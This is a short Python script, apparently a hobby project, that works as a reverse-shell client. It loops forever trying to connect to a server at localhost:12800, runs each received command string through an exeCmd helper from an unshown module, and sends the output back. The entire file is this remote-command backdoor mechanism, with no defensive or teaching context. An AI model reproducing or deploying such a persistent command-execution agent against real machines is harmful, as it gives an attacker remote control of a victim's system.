import socket
from cmd import *

ip = "localhost"
port = 12800

msg = ""

#Don't stop searching until client get a server.
def looking_for():
    connexion_status = 1
    while connexion_status != None:
        try:
            print("Conexiiiiiiiion")
            connexion_status = connexion.connect((ip, port))
        except Exception as e:
            None
    return connexion_status


def client_job(connexion_status):
    while connexion_status == None:
        try:
            msg = connexion.recv(1024).decode("utf-8")
        except Exception as e:
            print(e)
            break

        result = exeCmd(msg)

        if result == "":
            result = "No result"
        try:
            connexion.send(result.encode('utf-8'))
        except Exception as e:
            print(e)
            break


while(True): 
    connexion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_job(looking_for())
    connexion.close()

